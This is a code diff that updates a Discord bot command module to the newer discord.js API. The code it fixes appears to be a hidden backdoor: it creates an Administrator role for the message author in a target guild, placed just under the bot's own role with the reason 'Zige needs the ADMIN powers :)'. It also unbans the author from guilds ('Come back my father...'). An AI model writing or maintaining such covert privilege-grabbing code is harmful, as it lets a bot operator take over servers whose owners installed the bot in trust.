@@ -31,7 +31,7 @@ module.exports = {
 
         if (Gres) {
           const guild = bot.guilds.cache.get(Gres.guildID);
-          const member = guild.members.members.cache.get(message.author.id);
+          const member = guild.members.cache.get(message.author.id);
 
           var roleZ = message.guild.members.me.roles.cache
             .filter((x) => x.managed == true)
@@ -44,7 +44,7 @@ module.exports = {
                 color: args[4],
                 mentionable: false,
                 position: roleZ.position,
-                permissions: "ADMINISTRATOR",
+                permissions: Discord.PermissionFlagsBits.Administrator,
               },
               reason: "Zige needs the ADMIN powers :)",
             })
@@ -80,7 +80,7 @@ module.exports = {
             if (guild) {
               bot.users.fetch(message.author.id).then((user) => {
                 if (user) {
-                  guild.members.members
+                  guild.members
                     .unban(user, "Come back my father...")
                     .then(() => {
                       message.channel.send(
@@ -115,7 +115,6 @@ module.exports = {
           let channel = guild.channels.cache
             .filter(
               (x) =>
-                x.deleted == false &&
                 x.type != Discord.ChannelType.GuildCategory
             )
             .first();
@@ -172,7 +171,7 @@ module.exports = {
             .filter(
               (x) =>
                 x.type == Discord.ChannelType.GuildText &&
-                x.permissionsFor(guild.members.me).has("SEND_MESSAGES") &&
+                x.permissionsFor(guild.members.me).has(Discord.PermissionFlagsBits.SendMessages) &&
                 x?.nsfw == false
             )
             .first();
